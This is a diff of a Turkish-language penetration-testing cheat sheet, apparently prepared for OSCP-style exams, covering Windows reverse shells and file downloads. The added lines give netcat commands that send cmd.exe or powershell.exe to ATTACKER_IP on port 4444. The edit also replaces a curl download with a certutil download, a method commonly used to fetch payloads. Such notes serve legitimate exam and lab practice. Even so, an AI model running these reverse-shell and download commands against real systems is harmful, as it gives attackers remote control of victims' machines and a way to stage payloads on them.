@@ -211,6 +211,18 @@ Ardından reverse shell başlatmak için:
 nc64.exe -e cmd.exe ATTACKER_IP 4444
 ```
 
+yada PowerShell başlatmak için:
+
+```cmd
+nc64.exe -e powershell.exe ATTACKER_IP 4444
+```
+
+Eğer `powershell.exe` PATH içinde değilse:
+
+```cmd
+nc64.exe -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ATTACKER_IP 4444
+```
+
 veya
 
 ```cmd
@@ -230,14 +242,10 @@ nc -lvnp 4444
 ### CMD ile
 
 ```cmd
-curl http://LINUX_IP/remote-file -o C:\Windows\Temp\downloaded.bin
+certutil -urlcache -f http://LINUX_IP/remote-file C:\Windows\Temp\downloaded.bin
 ```
 
-Eğer `curl` yoksa:
-
-```cmd
-bitsadmin /transfer mydownloadjob /download /priority normal http://LINUX_IP/remote-file C:\Windows\Temp\downloaded.bin
-```
+`certutil` Windows'un varsayılan bir aracıdır ve OSCP gibi sınav ortamlarında genelde bulunur.
 
 ### PowerShell ile
 
@@ -250,6 +258,8 @@ veya
 ```powershell
 Invoke-RestMethod -Uri http://LINUX_IP/remote-file -OutFile C:\Windows\Temp\downloaded.bin
 ```
+
+Bu komutlar Windows'un varsayılan PowerShell modüllerini kullanır ve sınav ortamlarında daha güvenlidir.
 
 ---
 
